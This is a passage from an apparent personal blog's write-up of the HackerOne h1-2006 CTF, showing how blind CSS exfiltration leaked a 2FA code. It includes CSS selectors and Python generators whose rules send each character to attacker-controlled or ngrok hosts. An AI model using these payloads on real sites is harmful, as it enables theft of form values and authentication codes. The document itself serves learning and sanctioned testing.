</pre></table></code></div></div><p>The attack lies on the fact that instead of applying style, we can load an image from a server we control and exfiltrate data with the requested resource. With the previous example, we could exfiltrate the first character of the element that has the CSS id <code class="highlighter-rouge">username</code>:</p><div class="language-css highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nf">#username</span><span class="o">[</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"a"</span><span class="o">]</span> <span class="p">{</span> <span class="nl">background-image</span><span class="p">:</span> <span class="sx">url(https://attacker.server/a)</span><span class="p">;</span> <span class="p">}</span>
<span class="nf">#username</span><span class="o">[</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"b"</span><span class="o">]</span> <span class="p">{</span> <span class="nl">background-image</span><span class="p">:</span> <span class="sx">url(https://attacker.server/b)</span><span class="p">;</span> <span class="p">}</span>
<span class="nf">#username</span><span class="o">[</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"c"</span><span class="o">]</span> <span class="p">{</span> <span class="nl">background-image</span><span class="p">:</span> <span class="sx">url(https://attacker.server/c)</span><span class="p">;</span> <span class="p">}</span>
<span class="o">...</span>
<span class="nf">#username</span><span class="o">[</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"Y"</span><span class="o">]</span> <span class="p">{</span> <span class="nl">background-image</span><span class="p">:</span> <span class="sx">url(https://attacker.server/Y)</span><span class="p">;</span> <span class="p">}</span>
<span class="nf">#username</span><span class="o">[</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"Z"</span><span class="o">]</span> <span class="p">{</span> <span class="nl">background-image</span><span class="p">:</span> <span class="sx">url(https://attacker.server/Z)</span><span class="p">;</span> <span class="p">}</span>
</pre></table></code></div></div><h3 id="2fa-bypass-via-blind-css-exfil">2FA bypass via Blind CSS Exfil</h3><p>To test this attack I wrote a two-line Python script to generate the CSS rules automatically. I wanted to first see if there was any kind of input tags and if so get the first character of the <code class="highlighter-rouge">name</code> attribute: <code class="highlighter-rouge">input[name^='CHAR'] { background-image: url(https://my.server/CHAR); }</code>.</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="s">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_=?.:,;{}[]-%$&amp;/@#¿¡?!+ *^"</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"input[name^='"</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="s">"'] { background-image: url(https://2d3188647a55.ngrok.io/"</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="s">"); }"</span><span class="p">)</span>
</pre></table></code></div></div><p><em>Attack test 1</em></p><p><img src="/assets/posts_details/H1CTF-data/images/css1.png" alt="Img" /></p><p>Great! Knowing that the first character was a <code class="highlighter-rouge">c</code>, which could lead to <code class="highlighter-rouge">challenge</code>, was a hint that I was on the right track (I presumed). I kept on getting characters until I got to seven results: <code class="highlighter-rouge">code_1</code> through to <code class="highlighter-rouge">code_7</code>.</p><p><em>Getting names of inputs</em></p><p><img src="/assets/posts_details/H1CTF-data/images/css2.png" alt="Img" /></p><p>This meant that in reality there were 7 inputs, each one with one character. I modified the script a bit to get the value of each input and finally got the code.</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">8</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="s">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_=?.:,;{}[]-%$&amp;/@#¿¡?!+ *^"</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"input[name='code_"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">+</span><span class="s">"'][value='"</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="s">"'] { background-image: url(https://b639028487fc.ngrok.io/code_"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">+</span><span class="s">":"</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="s">"); }"</span><span class="p">)</span>
</pre></table></code></div></div><p><em>Exfiltration of the code</em></p><p><img src="/assets/posts_details/H1CTF-data/images/css3.png" alt="Img" /></p><p>I submitted it keeping the order of the inputs from their names: <code class="highlighter-rouge">FT0qval</code>. Finally I had finished it!</p><p><em>CTF Completed</em></p><p><img src="/assets/posts_details/H1CTF-data/images/last.png" alt="Img" /></p><h1 id="afterthoughts">Afterthoughts</h1><p>After this amazing and tiring challenge I can say that on top of learning a lot of cool technical tricks and techniques, I grew some skills which I think are important.</p><p>The key technical takeaways for me are:</p><ul><li>2FA bypass using my own MD5 hash.</li><li>SSRF via path traversal using an API and then use that to access restricted subdomains.</li><li>Android! I had never even touched the topic and for a first contact I learned quite a lot.</li><li>API enumeration with ffuf, always remember to check different HTTP methods.</li><li>Chaining different flaws can lead to a vulnerability even if by themselves it’s nothing.</li><li>Blind CSS Exfiltration, really nice final challenge!</li></ul><p>As for other skills the CTF helped me develop:</p><ul><li><p>Don’t try to go too fast: on the last challenge at first I tried to immediately get the value of the input and I didn’t bother trying to understand why I got 7 results. I thought the order may be wrong so wrote a permutations generator and bruteforced the code with ffuf but without luck. After giving it some time I finally understood it and could solve it. Patience and perseverance are key!</p></li><li><p>Always try to enumerate more: one of the things the API challenge taught me was to always keep digging, if it doesn’t work after many attempts something must be missing.</p></li><li><p>Keep notes! This was definitely one of the most crucial things that helped me solve the CTF. Expecting it to be a long challenge I kept all my findings in a Notion page, which definitely saved me a lot of time and helped me organise my thoughts better.</p></li></ul><p>That was it, it was a long way but definitely worth the time and effort. I cannot thank enought the creators for making this amazing challenge happen and hope to be able to do something similar soon!</p><p>See you next time!</p><hr /><p>Diego Bernal Adelantado</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/bug-bounty/'>Bug Bounty</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/bug-bounty/" class="post-tag no-text-decoration" >Bug Bounty</a> <a href="/tags/android/" class="post-tag no-text-decoration" >Android</a> <a href="/tags/ssrf/" class="post-tag no-text-decoration" >SSRF</a> <a href="/tags/css/" class="post-tag no-text-decoration" >CSS</a> <a href="/tags/enumeration/" class="post-tag no-text-decoration" >Enumeration</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackerOne h1-2006 CTF write-up - GoDiego&url=https://diego95root.github.io/posts/H1-2006-CTF/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackerOne h1-2006 CTF write-up - GoDiego&u=https://diego95root.github.io/posts/H1-2006-CTF/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackerOne h1-2006 CTF write-up - GoDiego&url=https://diego95root.github.io/posts/H1-2006-CTF/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://diego95root.github.io/posts/H1-2006-CTF/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Cache/">HackTheBox: Cache write-up</a></li><li><a href="/posts/Admirer/">HackTheBox: Admirer write-up</a></li><li><a href="/posts/Safe/">Hack The Box: Safe write-up</a></li><li><a href="/posts/Networked/">Hack The Box: Networked write-up</a></li><li><a href="/posts/Magic/">Hack The Box: Magic write-up</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/permissions/">Permissions</a> <a class="post-tag" href="/tags/ssh/">SSH</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/file-upload/">File Upload</a> <a class="post-tag" href="/tags/enumeration/">Enumeration</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Admirer/" class="btn btn-outline-primary"><p>HackTheBox: Admirer write-up</p></a> <a href="/posts/Cache/" class="btn btn-outline-primary"><p>HackTheBox: Cache write-up</p></a></div><!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Admirer/"><div class="card-body"> <span class="timeago small"> Jun 3, 2020 <i class="unloaded">2020-06-03T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox: Admirer write-up</h3><div class="text-muted small"><p>Hack The Box: Magic machine write-up This was one of the most interesting machines I’ve solved in Hack The Box, learned some cool techniques. It taught me how recon never ends, despite having foun...</p></div></div></a></div><div class="card"> <a href="/posts/IceCTF-web/"><div class="card-body"> <span class="timeago small"> Sep 2, 2018 <i class="unloaded">2018-09-02T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>IceCTF 2018: Web write-ups</h3><div class="text-muted small"><p>Web 1. Toke Relaunch Challenge description: We’ve relaunched our famous website, Toke! Hopefully no one will hack it again and take it down like the last time. Once we access the static webpage w...</p></div></div></a></div><div class="card"> <a href="/posts/Luke/"><div class="card-body"> <span class="timeago small"> Jun 6, 2019 <i class="unloaded">2019-06-06T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box: Luke write-up</h3><div class="text-muted small"><p>Hack The Box: Luke machine write-up This machine, that runs with ip 10.10.10.137, was pretty straigthforward, it was only based on thorough enumeration. One aspect I really liked is that I got to ...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js" crossorigin="anonymous"></script> <script type="text/javascript"> const el = document.querySelectorAll('#post-wrapper img'); const observer = lozad(el); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://twitter.com/secfaults">Diego Bernal Adelantado</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/permissions/">Permissions</a> <a class="post-tag" href="/tags/ssh/">SSH</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/file-upload/">File Upload</a> <a class="post-tag" href="/tags/enumeration/">Enumeration</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-167902069-1', 'auto'); ga('send', 'pageview'); </script> --> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-167902069-1" crossorigin="anonymous"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-167902069-1'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://diego95root.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
